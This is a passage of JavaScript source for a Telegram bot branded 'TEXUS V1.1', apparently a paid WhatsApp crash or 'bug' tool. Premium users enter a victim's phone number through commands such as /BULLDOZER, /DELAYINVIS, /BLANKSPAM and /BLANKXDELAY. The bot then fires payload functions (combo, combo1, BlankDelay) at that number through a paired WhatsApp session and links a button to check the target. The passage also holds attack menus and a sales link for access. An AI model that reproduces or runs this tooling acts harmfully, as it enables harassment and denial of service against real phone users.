├❒ /𝕭𝖀𝕷𝕷𝕯𝕺𝖅𝕰𝕽 : 62𝖝𝖝𝖝
├❒ /𝕯𝕰𝕷𝕬𝖄𝕴𝕹𝖁𝕴𝕾 : 62𝖝𝖝𝖝
╰──────────────────
\`\`\``;
  }
  
  else if (data === "attack2") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕭𝖀𝕲 𝕿𝖄𝕻𝕰 』─────╮
├❒ /𝕭𝕷𝕬𝕹𝕶𝕾𝕻𝕬𝕸 : 62𝖝𝖝𝖝
├❒ /𝕭𝕷𝕬𝕹𝕶𝖃𝕯𝕰𝕷𝕬𝖄 : 62𝖝𝖝𝖝
╰──────────────────
\`\`\``;
  }
  
  else if (data === "tools") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕿𝕺𝕺𝕷𝕾 』─────╮
├❒ /𝕬𝕴 <𝕿𝕬𝕾𝕶>
├❒ /𝕯𝕰𝕷𝕭𝖀𝕲 <62𝖝𝖈>
├❒ /𝕿𝕺𝖀𝕽𝕷 <𝕽𝕰𝕻𝕰𝕷𝕬𝖄>
├❒ /𝕲𝕰𝕿𝕻𝕻 <𝕽𝕰𝕻𝕷𝕬𝖄>
├❒ /𝕶𝕴𝕮𝕶 <𝕽𝕰𝕻𝕰𝕷𝕬𝖄>
╰──────────────────
\`\`\``;
  }
  
  else if (data === "tools2") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕿𝕺𝕺𝕷𝕾 𝖁2 』─────╮
├❒ 𝕮𝕺𝕸𝕴𝕹𝕲 𝕾𝕺𝕺𝕹
╰──────────────────
\`\`\``;
  }
  
  else if (data === "produk") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕻𝕽𝕺𝕯𝖀𝕶 』─────╮
├❒ 𝕬𝕯𝕸𝕴𝕹 𝕻𝕬𝕹𝕰𝕷
├❒ 𝕭𝕬𝕾𝕰 𝖂𝕬/𝕿𝕰𝕷𝕰
├❒ 𝕱𝖀𝕹𝕮𝕿𝕴𝕺𝕹
├❒ 𝕻𝕿 𝕱𝖀𝕹𝕮𝕿𝕴𝕺𝕹
├❒ 𝕿𝕺𝕺𝕷𝕾
├❒ 𝕳𝖀𝕭𝖀𝕹𝕲𝕴 𝕽7𝖃
╰──────────────────
\`\`\``;
  }
  
  else if (data === "tqto") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ᴏɴʟɪɴᴇ
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰──────────────────
╭––『 𝕿𝕼𝕿𝕺 』─────╮
├❒ 𝕬𝕷𝖄𝖂𝕬𝕾𝕽7𝖃 <𝕯𝕬𝖁>
├❒ 𝕯𝕬𝖃𝖄 <𝕯𝕰𝖁>
├❒ 𝕿𝕰𝕳 𝕸𝕬𝕹𝕴𝕾 <𝕻𝕿>
├❒ 𝕹𝕴𝖅𝕬𝕽 <𝕻𝕿>
├❒ 𝕷𝕰𝕮𝕮 <𝕻𝕿>
├❒ 𝕾𝕻𝕺𝕺𝕹 <𝕾𝖀𝕻𝕻𝕺𝕽𝕿>
╰──────────────────
\`\`\``;
  }

  else if (data === "mainmenu") {
    caption = `\`\`\`
ハローハウ ${username}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭––『 𝕿𝕰𝖃𝖀𝕾 𝖁1.1 』──╮
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾 : ONLINE
├❒ 𝖀𝕻𝕿𝕴𝕸𝕰 : ${runtime}
├❒ 𝖀𝕾𝕰𝕽 : ${msg.from.username}
╰─────────────────
╭––『 𝖀𝕾𝕰𝕽 𝕴𝕹𝕱𝕺 』───╮
├❒ 𝕹𝕬𝕸𝕰 : @${username}
├❒ 𝕴𝕯 : ${userId}
╰─────────────────
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕬𝖀𝕿𝕳𝕺𝕽 : 𝕽7𝖃/𝕯𝕬𝖃𝖄
├❒ 𝕷𝕬𝕹𝕲𝖀𝕬𝕲𝕰 : 𝕵𝕬𝖁𝕬𝕾𝕮𝕽𝕴𝕻𝕿
╰─────────────────
\`\`\``;

    keyboard = [
      [
          { text: "𝕬𝖙𝖙𝖆𝖈𝖐 𝖁1", callback_data: "attack1" },
          { text: "𝕾𝖊𝖙𝖙𝖎𝖓𝖌𝖘", callback_data: "owner" },
          { text: "𝕬𝖙𝖙𝖆𝖈𝖐 𝖛2", callback_data: "attack2" }
        ],
        [
          { text: "𝕿𝕺𝕺𝕷𝕾 𝖁1", callback_data: "tools" },
          { text: "𝕿𝕺𝕺𝕷𝕾 𝖁2", callback_data: "tools2" }
        ],
        [
          { text: "𝕻𝕽𝕺𝕯𝖀𝕶", callback_data: "produk" },
          { text: "𝕿𝕼𝕿𝕺", callback_data: "tqto" },
          { text: "𝕴𝕹𝕱𝕺𝕸𝕬𝕿𝕴𝕺𝕹", url: "t.me/r7xnight" }
      ]
    ];
  }

  try {
    await bot.sendPhoto(chatId, img, {
      caption,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });
  } catch (e) {}

  await bot.answerCallbackQuery(q.id);
});


// ======= ( Parameter ) ======= \\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

//// =====( CASE BUG 1 ) ===== \\\\
bot.onText(/\/BULLDOZER (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝖁1.1</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕭𝖀𝖄 𝕬𝕮𝕮𝕰𝕾", url: "https://t.me/Alywasr7x" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ 𝕮𝕺𝕺𝕷𝕯𝕺𝖂𝕹 𝕬𝕶𝕿𝕴𝕱. 𝕮𝕺𝕭𝕬 𝕷𝕬𝕲𝕴 𝕯𝕬𝕷𝕬𝕸 ${cooldown} 𝕯𝕰𝕿𝕴𝕶.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ 𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕰𝕷𝖀𝕸 𝕿𝕰𝕽𝕳𝖀𝕭𝖀𝕹𝕲. 𝕵𝕬𝕷𝕬𝕹𝕶𝕬𝕹 /𝖃𝕻𝕬𝕴𝕽𝕴𝕹𝕲 𝕿𝕰𝕽𝕷𝕰𝕭𝕴𝕳 𝕯𝕬𝕳𝖀𝕷𝖀`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "𝕭𝕺𝕿 𝕴𝕹𝕴 𝕳𝕬𝕹𝖄𝕬 𝕭𝕴𝕾𝕬 𝕯𝕴 𝕲𝖀𝕹𝕬𝕶𝕬𝕹 𝕯𝕴 𝕯𝕬𝕷𝕬𝕸 𝕲𝕽𝕺𝖀𝕭.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[𝕻𝕽𝕺𝕾𝕰𝕾 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲 𝕿𝕰𝖃𝖀𝕾]\x1b[0m𝕿𝖀𝕹𝕲𝕲𝖀 𝕳𝕴𝕹𝕲𝕲𝕬 𝕰𝕷𝕰𝕾𝕬𝕴");

         await combo(jid, sock);
       
        console.log("\x1b[31m[𝕾𝖀𝕮𝕮𝕰𝕾𝕾]\x1b[0m 𝕭𝖀𝕲 𝕭𝕰𝕽𝕳𝕬𝕾𝕴𝕷 𝕯𝕴𝕶𝕴𝕽𝕴𝕸! 𝕿𝕰𝖃𝖀𝕾");

        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ 𝕲𝕬𝕲𝕬𝕷 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲: ${err.message}`);
    }
});

bot.onText(/\/DELAYINVIS (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝖁1.1</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕭𝖀𝖄 𝕬𝕮𝕮𝕰𝕾", url: "https://t.me/Alywasr7x" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ 𝕮𝕺𝕺𝕷𝕯𝕺𝖂𝕹 𝕬𝕶𝕿𝕴𝕱. 𝕮𝕺𝕭𝕬 𝕷𝕬𝕲𝕴 𝕯𝕬𝕷𝕬𝕸 ${cooldown} 𝕯𝕰𝕿𝕴𝕶.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ 𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕰𝕷𝖀𝕸 𝕿𝕰𝕽𝕳𝖀𝕭𝖀𝕹𝕲. 𝕵𝕬𝕷𝕬𝕹𝕶𝕬𝕹 /𝖃𝕻𝕬𝕴𝕽𝕴𝕹𝕲 𝕿𝕰𝕽𝕷𝕰𝕭𝕴𝕳 𝕯𝕬𝕳𝖀𝕷𝖀`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "𝕭𝕺𝕿 𝕴𝕹𝕴 𝕳𝕬𝕹𝖄𝕬 𝕭𝕴𝕾𝕬 𝕯𝕴 𝕲𝖀𝕹𝕬𝕶𝕬𝕹 𝕯𝕴 𝕯𝕬𝕷𝕬𝕸 𝕲𝕽𝕺𝖀𝕭.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[𝕻𝕽𝕺𝕾𝕰𝕾 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲 𝕿𝕰𝖃𝖀𝕾]\x1b[0m𝕿𝖀𝕹𝕲𝕲𝖀 𝕳𝕴𝕹𝕲𝕲𝕬 𝕰𝕷𝕰𝕾𝕬𝕴");

         await combo1(jid, sock);
         await combo(jid, sock);
       
        console.log("\x1b[31m[𝕾𝖀𝕮𝕮𝕰𝕾𝕾]\x1b[0m 𝕭𝖀𝕲 𝕭𝕰𝕽𝕳𝕬𝕾𝕴𝕷 𝕯𝕴𝕶𝕴𝕽𝕴𝕸! 𝕿𝕰𝖃𝖀𝕾");

        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ 𝕲𝕬𝕲𝕬𝕷 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲: ${err.message}`);
    }
});

bot.onText(/\/BLANKSPAM (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝖁1.1</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕭𝖀𝖄 𝕬𝕮𝕮𝕰𝕾", url: "https://t.me/Alywasr7x" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ 𝕮𝕺𝕺𝕷𝕯𝕺𝖂𝕹 𝕬𝕶𝕿𝕴𝕱. 𝕮𝕺𝕭𝕬 𝕷𝕬𝕲𝕴 𝕯𝕬𝕷𝕬𝕸 ${cooldown} 𝕯𝕰𝕿𝕴𝕶.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ 𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕰𝕷𝖀𝕸 𝕿𝕰𝕽𝕳𝖀𝕭𝖀𝕹𝕲. 𝕵𝕬𝕷𝕬𝕹𝕶𝕬𝕹 /𝖃𝕻𝕬𝕴𝕽𝕴𝕹𝕲 𝕿𝕰𝕽𝕷𝕰𝕭𝕴𝕳 𝕯𝕬𝕳𝖀𝕷𝖀`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "𝕭𝕺𝕿 𝕴𝕹𝕴 𝕳𝕬𝕹𝖄𝕬 𝕭𝕴𝕾𝕬 𝕯𝕴 𝕲𝖀𝕹𝕬𝕶𝕬𝕹 𝕯𝕴 𝕯𝕬𝕷𝕬𝕸 𝕲𝕽𝕺𝖀𝕭.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[𝕻𝕽𝕺𝕾𝕰𝕾 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲 𝕿𝕰𝖃𝖀𝕾]\x1b[0m𝕿𝖀𝕹𝕲𝕲𝖀 𝕳𝕴𝕹𝕲𝕲𝕬 𝕰𝕷𝕰𝕾𝕬𝕴");

         await BlankDelay(jid, sock);
       
        console.log("\x1b[31m[𝕾𝖀𝕮𝕮𝕰𝕾𝕾]\x1b[0m 𝕭𝖀𝕲 𝕭𝕰𝕽𝕳𝕬𝕾𝕴𝕷 𝕯𝕴𝕶𝕴𝕽𝕴𝕸! 𝕿𝕰𝖃𝖀𝕾");

        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ 𝕲𝕬𝕲𝕬𝕷 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲: ${err.message}`);
    }
});

bot.onText(/\/BLANKXDELAY (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝕿𝕰𝖃𝖀𝕾 𝖁1.1</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕭𝖀𝖄 𝕬𝕮𝕮𝕰𝕾", url: "https://t.me/Alywasr7x" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ 𝕮𝕺𝕺𝕷𝕯𝕺𝖂𝕹 𝕬𝕶𝕿𝕴𝕱. 𝕮𝕺𝕭𝕬 𝕷𝕬𝕲𝕴 𝕯𝕬𝕷𝕬𝕸 ${cooldown} 𝕯𝕰𝕿𝕴𝕶.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ 𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕰𝕷𝖀𝕸 𝕿𝕰𝕽𝕳𝖀𝕭𝖀𝕹𝕲. 𝕵𝕬𝕷𝕬𝕹𝕶𝕬𝕹 /𝖃𝕻𝕬𝕴𝕽𝕴𝕹𝕲 𝕿𝕰𝕽𝕷𝕰𝕭𝕴𝕳 𝕯𝕬𝕳𝖀𝕷𝖀`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "𝕭𝕺𝕿 𝕴𝕹𝕴 𝕳𝕬𝕹𝖄𝕬 𝕭𝕴𝕾𝕬 𝕯𝕴 𝕲𝖀𝕹𝕬𝕶𝕬𝕹 𝕯𝕴 𝕯𝕬𝕷𝕬𝕸 𝕲𝕽𝕺𝖀𝕭.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[𝕻𝕽𝕺𝕾𝕰𝕾 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲 𝕿𝕰𝖃𝖀𝕾]\x1b[0m𝕿𝖀𝕹𝕲𝕲𝖀 𝕳𝕴𝕹𝕲𝕲𝕬 𝕰𝕷𝕰𝕾𝕬𝕴");

         await BlankDelay(jid, sock);
         await combo1(jid, sock);
       
        console.log("\x1b[31m[𝕾𝖀𝕮𝕮𝕰𝕾𝕾]\x1b[0m 𝕭𝖀𝕲 𝕭𝕰𝕽𝕳𝕬𝕾𝕴𝕷 𝕯𝕴𝕶𝕴𝕽𝕴𝕸! 𝕿𝕰𝖃𝖀𝕾");

        await bot.editMessageCaption(`
\`\`\`
╭––『 𝕭𝕺𝕿 𝕴𝕹𝕱𝕺 』─────╮
├❒ 𝕿𝕬𝕽𝕲𝕰𝕿: ${formattedNumber}
├❒ 𝕿𝖄𝕻𝕰: 𝕯𝕰𝕷𝕬𝖄
├❒ 𝕾𝕿𝕬𝕿𝖀𝕾: 𝕾𝕰𝕹𝕯𝕴𝕹𝕲 𝕭𝖀𝕲
╰─────────────────
\`\`\``, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝕮𝕰𝕶 ☇ 𝕿𝕬𝕽𝕲𝕰𝕿", url: `https://wa.me/${formattedNumber}` }],
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ 𝕲𝕬𝕲𝕬𝕷 𝕸𝕰𝕹𝕲𝕴𝕽𝕴𝕸 𝕭𝖀𝕲: ${err.message}`);
    }
});
///======( Plugin ) ======\\\
bot.onText(/\AI(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]?.trim();

  if (!text) {
    return bot.sendMessage(
      chatId,
      "❌ Masukkan teks setelah perintah `/AI` untuk mendapatkan respons.",
      { parse_mode: "HTML" }
    );
  }

  try {
    const response = await axios.post(
      "https://chateverywhere.app/api/chat/",
      {
        model: {
          id: "gpt-4",
          name: "GPT-4",
          maxLength: 32000,
          tokenLimit: 8000,
          completionTokenLimit: 5000,
          deploymentName: "gpt-4"
        },
